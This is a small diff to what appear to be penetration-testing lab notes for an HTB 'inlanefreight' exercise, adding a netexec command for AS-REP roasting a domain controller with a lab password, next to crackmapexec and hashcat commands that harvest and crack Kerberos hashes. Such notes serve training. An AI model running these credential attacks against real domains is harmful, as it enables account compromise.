@@ -246,3 +246,11 @@ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproa
 ```
 hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
 ```
+
+if doens't work run netexec
+```
+nxc ldap 10.129.191.62 -u grace -p Inlanefreight01! --asreproast output.txt
+```
+
+Reference: https://www.netexec.wiki/ldap-protocol/asreproast
+
